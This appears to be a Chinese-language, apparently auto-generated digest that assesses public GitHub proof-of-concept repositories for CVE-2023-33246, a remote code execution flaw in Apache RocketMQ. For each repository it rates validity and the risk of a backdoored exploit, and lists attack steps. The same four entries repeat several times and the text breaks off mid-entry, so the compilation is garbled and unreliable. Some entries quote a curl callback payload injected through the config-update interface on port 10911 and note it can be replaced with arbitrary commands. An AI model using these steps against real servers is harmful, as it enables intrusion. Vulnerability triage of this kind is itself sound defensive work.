**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

